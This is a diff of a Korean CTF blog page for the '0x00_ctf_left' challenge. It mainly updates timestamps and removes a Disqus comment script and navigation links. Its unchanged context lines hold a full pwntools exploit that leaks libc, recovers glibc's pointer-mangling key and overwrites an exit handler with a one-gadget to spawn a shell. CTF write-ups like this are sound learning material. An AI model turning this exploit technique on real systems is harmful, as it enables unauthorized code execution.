@@ -17,7 +17,7 @@
 <meta property="og:site_name" content="귀찮다">
 <meta property="og:description" content="libc leak, 원하는 주소값 leak, 원하는 주소에 값을 쓸 수 있게 해줌.">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-25T10:17:02.712Z">
+<meta property="og:updated_time" content="2018-09-25T10:19:47.229Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0x00_ctf_left">
 <meta name="twitter:description" content="libc leak, 원하는 주소값 leak, 원하는 주소에 값을 쓸 수 있게 해줌.">
@@ -305,17 +305,6 @@
 <p>+128에 있는 명령을 보면 알 수 있듯 rdx엔 *next+24의 값이 들어가고, ror 연산과 xor 연산을 거쳐 변조 되므로, 역연산해서 써넣어야 할 값을 알아내야 함.</p>
 <p><code> fs:0x30 - &gt; _dl_fini </code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./left&quot;)</span><br><span class="line">v = 0xffffffffffffffffL</span><br><span class="line">rol = lambda x : (x &lt;&lt; 0x11 &amp; v)|(x &gt;&gt; 64-(0x11))</span><br><span class="line">ror = lambda x : ((x&gt;&gt;64-(0x11) &amp; v)) | (x &gt;&gt; 0x11)</span><br><span class="line">l = ELF(&quot;/libc-2.23.so&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;printf(): &quot;)</span><br><span class="line">data = int(p.recv(15))</span><br><span class="line">log.info(&quot;printf addr: 0x%08x&quot;%data)</span><br><span class="line"></span><br><span class="line">libc_base = data - l.symbols[&apos;printf&apos;]</span><br><span class="line">log.info(&quot;libc_base : 0x%08x&quot;% libc_base)</span><br><span class="line">atexit = libc_base + l.symbols[&apos;__cxa_atexit&apos;]</span><br><span class="line">leak = atexit+24</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(str(leak))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">rdx = int(p.recv(15))</span><br><span class="line">real_addr = ror(rdx)</span><br><span class="line"></span><br><span class="line">df = libc_base + 0x3daab0 # _dl_fini </span><br><span class="line">log.info(&quot;df : 0x%08x&quot; % df)</span><br><span class="line">key = real_addr ^ df</span><br><span class="line"></span><br><span class="line">magic1 =(libc_base + 0x4526a)^key</span><br><span class="line">magic2 = rol(magic1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(str(leak))</span><br><span class="line">p.sendline(str(magic2))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><div id="disqus_thread"></div></p>
-<script>
-
-<p>/**</p>
-<ul>
-<li>RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.</li>
-<li>LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: <a href="https://disqus.com/admin/universalcode/#configuration-variables*/">https://disqus.com/admin/universalcode/#configuration-variables*/</a><br>/<em><br>var disqus_config = function () {<br>this.page.url = PAGE_URL;  // Replace PAGE_URL with your page’s canonical URL variable<br>this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page’s unique identifier variable<br>};
-</em>/<br>(function() { // DON’T EDIT BELOW THIS LINE<br>var d = document, s = d.createElement(‘script’);<br>s.src = ‘<a href="https://blog-z2e4o6-com.disqus.com/embed.js&#39;">https://blog-z2e4o6-com.disqus.com/embed.js&#39;</a>;<br>s.setAttribute(‘data-timestamp’, +new Date());<br>(d.head || d.body).appendChild(s);<br>})();<br></script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
-
-
-
 
       
     </div>
@@ -327,21 +316,12 @@
         <p><span>제목:</span><a  href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
         <p><span>발행 시간:</span>2018년09월25일 - 05시25분</p>
-        <p><span>마지막 업데이트:</span>2018년09월25일 - 19시17분</p>
+        <p><span>마지막 업데이트:</span>2018년09월25일 - 19시19분</p>
     </div>
 
 
 
 <nav id="article-nav">
-  
-    <a  href="/2018/09/25/tes/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          tes
-        
-      </div>
-    </a>
   
   
     <a  href="/2018/09/24/0ctfbabyheap/" id="article-nav-older" class="article-nav-link-wrap">
@@ -430,9 +410,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2018/09/25/tes/" title="上一篇: tes">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="HOME"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
@@ -441,7 +419,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/tes/">tes</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/0ctfbabyheap/">0ctfbabyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/0ctfbabyheap/">0ctfbabyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
     
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
